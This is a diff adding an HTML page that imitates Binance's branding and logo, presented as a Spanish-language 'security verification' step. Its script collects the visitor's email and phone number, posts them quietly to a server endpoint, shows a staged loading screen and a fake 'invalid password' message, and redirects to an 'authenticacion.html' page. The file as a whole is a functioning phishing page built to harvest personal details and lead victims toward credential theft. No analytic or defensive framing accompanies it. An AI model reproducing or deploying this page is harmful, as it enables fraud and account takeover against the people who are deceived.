@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación de Seguridad</title>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Segoe UI',sans-serif;
+}
+
+body{
+
+    background:#181A20;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    padding:60px;
+
+}
+#loaderScreen {
+    display: none; 
+    position: fixed; 
+    inset: 0; 
+    background: #181A20; 
+    z-index: 9999; 
+    flex-direction: column; 
+    justify-content: center; 
+    align-items: center; 
+    color: white;
+}
+
+/* Spinner sencillo */
+.spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #FCD535;
+    border-top: 5px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+.card{
+
+    width:470px;
+    background:#1E2329;
+    border-radius:25px;
+    padding:40px;
+    box-shadow:0 20px 40px rgba(0,0,0,.35);
+
+}
+
+h1{
+
+    color:white;
+    font-size:40px;
+    line-height:48px;
+    margin-bottom:20px;
+
+}
+
+.descripcion{
+
+    color:#848E9C;
+    font-size:17px;
+    margin-bottom:30px;
+
+}
+
+#contador{
+
+    color:#FCD535;
+    font-size:56px;
+    font-weight:bold;
+    margin-bottom:30px;
+
+}
+
+.item{
+
+    border:1px solid #353945;
+    border-radius:15px;
+    padding:18px 20px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    cursor:pointer;
+    transition:.25s;
+    margin-bottom:18px;
+
+}
+
+.item:hover{
+
+    border-color:#FCD535;
+    transform:translateY(-2px);
+
+}
+
+.left{
+
+    display:flex;
+    align-items:center;
+    gap:15px;
+    color:white;
+    font-size:18px;
+
+}
+
+.right{
+
+    font-size:24px;
+    color:white;
+
+}
+
+.completado{
+
+    border-color:#00C853;
+    background:#0F2F21;
+
+}
+
+.completado .right{
+
+    color:#00C853;
+    font-weight:bold;
+
+}
+
+.info{
+
+    text-align:center;
+    color:#FCD535;
+    margin-top:25px;
+    font-size:15px;
+
+}
+
+.link{
+
+    text-align:center;
+    color:#FCD535;
+    margin-top:12px;
+    cursor:pointer;
+
+}
+
+/* MODAL */
+
+.modal{
+
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.65);
+    backdrop-filter:blur(5px);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    z-index:999;
+
+}
+
+.modal-box{
+
+    width:420px;
+    background:#1E2329;
+    border-radius:20px;
+    padding:30px;
+    animation:subir .25s;
+
+}
+
+@keyframes subir{
+
+from{
+
+opacity:0;
+transform:translateY(25px);
+
+}
+
+to{
+
+opacity:1;
+transform:translateY(0);
+
+}
+
+}
+
+.modal-header{
+
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:20px;
+
+}
+
+.modal-header h2{
+
+color:white;
+font-size:26px;
+
+}
+
+.close{
+
+font-size:30px;
+cursor:pointer;
+color:#848E9C;
+
+}
+
+.close:hover{
+
+color:white;
+
+}
+
+.modal p{
+
+color:#848E9C;
+margin-bottom:20px;
+
+}
+
+input{
+
+width:100%;
+padding:15px;
+border:none;
+outline:none;
+border-radius:10px;
+background:#2B3139;
+color:white;
+font-size:16px;
+
+}
+
+button{
+
+width:100%;
+margin-top:25px;
+padding:15px;
+background:#FCD535;
+border:none;
+border-radius:10px;
+font-size:18px;
+font-weight:bold;
+cursor:pointer;
+transition:.25s;
+
+}
+
+button:hover{
+
+background:#F0B90B;
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="card">
+<svg height="24" width="120" class="bn-svg default-icon block" viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg"><path fill="#F0B90B" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path></svg>
+
+<h1>Requisitos de la<br>verificación de<br>seguridad</h1>
+
+<p class="descripcion">
+Necesitas completar todas las verificaciones siguientes para continuar.
+</p>
+
+<div id="contador">0/2</div>
+
+<div class="item" id="correoItem" onclick="abrirModal('correo')">
+
+<div class="left">
+
+📧 Correo electrónico
+
+</div>
+
+<div class="right" id="correoEstado">
+
+➜
+
+</div>
+
+</div>
+
+<div class="item" id="telefonoItem" onclick="abrirModal('telefono')">
+
+<div class="left">
+
+📱 Número de teléfono
+
+</div>
+
+<div class="right" id="telefonoEstado">
+
+➜
+
+</div>
+
+</div>
+
+<div class="info">
+
+Utiliza llaves de acceso para completar la verificación
+
+</div>
+
+<div class="link">
+
+¿Verificación de seguridad no disponible?
+
+</div>
+
+</div>
+
+<!-- Modal Correo -->
+
+<div class="modal" id="correoModal">
+
+<div class="modal-box">
+
+<div class="modal-header">
+
+<h2>Correo electrónico</h2>
+
+<div class="close" onclick="cerrarModal('correo')">&times;</div>
+
+</div>
+
+<p>
+
+Ingresa el correo electrónico para continuar.
+
+</p>
+
+<input
+type="email"
+placeholder="correo@ejemplo.com"
+id="correoInput">
+
+<button onclick="enviarCorreo()">
+
+Enviar
+
+</button>
+
+</div>
+
+</div>
+
+<!-- Modal Telefono -->
+
+<div class="modal" id="telefonoModal">
+
+<div class="modal-box">
+
+<div class="modal-header">
+
+<h2>Número de teléfono</h2>
+
+<div class="close" onclick="cerrarModal('telefono')">&times;</div>
+
+</div>
+
+<p>
+
+Ingresa tu número telefónico.
+
+</p>
+
+<input
+type="text"
+placeholder="+57 3001234567"
+id="telefonoInput">
+
+<button onclick="enviarTelefono()">
+
+Enviar
+
+</button>
+
+</div>
+
+</div>
+<div id="loaderScreen">
+    <div class="spinner"></div>
+    <p style="margin-top:20px;">Verificando información de seguridad...</p>
+    <p id="mensajeExito" style="color: red; font-weight: bold; font-size: 20px; display: none; margin-top: 20px;">
+        Contraseña invalida.....
+    </p>
+</div>
+<script>
+
+let correo=false;
+let telefono=false;
+
+function abrirModal(tipo){
+
+document.getElementById(tipo+"Modal").style.display="flex";
+
+}
+
+function cerrarModal(tipo){
+
+document.getElementById(tipo+"Modal").style.display="none";
+
+}
+
+function actualizar(){
+
+let total=0;
+
+if(correo) total++;
+if(telefono) total++;
+
+document.getElementById("contador").innerHTML=total+"/2";
+
+}
+
+// Variable para saber si ya enviamos el correo y el teléfono
+let correoEnviado = false;
+let telefonoEnviado = false;
+
+// Esta función es para el envío "silencioso" (sin pantalla de carga)
+async function enviarSilencioso(tipo, valor) {
+    try {
+        await fetch('/api/verificacion', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ tipo, valor })
+        });
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+async function enviarCorreo() {
+    const valor = document.getElementById('correoInput').value;
+    if (!valor) return alert("Ingresa un correo");
+
+    const exito = await enviarSilencioso('correo', valor);
+    if (exito) {
+        correo = true;
+        correoEnviado = true; // Marcamos como listo
+        document.getElementById("correoItem").classList.add("completado");
+        document.getElementById("correoEstado").innerHTML = "✔";
+        cerrarModal("correo");
+        actualizar();
+        verificarFinalizacion(); // Revisa si ya podemos lanzar la pantalla de carga
+    }
+}
+
+async function enviarTelefono() {
+    const valor = document.getElementById('telefonoInput').value;
+    if (!valor) return alert("Ingresa un teléfono");
+
+    const exito = await enviarSilencioso('telefono', valor);
+    if (exito) {
+        telefono = true;
+        telefonoEnviado = true; // Marcamos como listo
+        document.getElementById("telefonoItem").classList.add("completado");
+        document.getElementById("telefonoEstado").innerHTML = "✔";
+        cerrarModal("telefono");
+        actualizar();
+        verificarFinalizacion(); 
+    }
+}
+
+async function verificarFinalizacion() {
+    if (correoEnviado && telefonoEnviado) {
+        // 1. Mostrar pantalla de carga
+        const loader = document.getElementById('loaderScreen');
+        const mensaje = document.getElementById('mensajeExito');
+        loader.style.display = 'flex';
+        
+        // 2. Esperar 10 segundos
+        await new Promise(resolve => setTimeout(resolve, 10000));
+        
+        // 3. Ocultar el spinner y mostrar el mensaje en rojo
+        loader.querySelector('.spinner').style.display = 'none'; // Ocultar spinner
+        loader.querySelector('p').style.display = 'none'; // Ocultar texto anterior
+        mensaje.style.display = 'block'; // Mostrar "Envío exitoso"
+        
+        // 4. Esperar 1 segundo adicional para que el usuario lea el mensaje
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // 5. Redirección
+        window.location.href = "authenticacion.html";
+    }
+}
+
+window.onclick=function(e){
+
+if(e.target.id=="correoModal")
+cerrarModal("correo");
+
+if(e.target.id=="telefonoModal")
+cerrarModal("telefono");
+
+}
+
+</script>
+
+</body>
+</html>
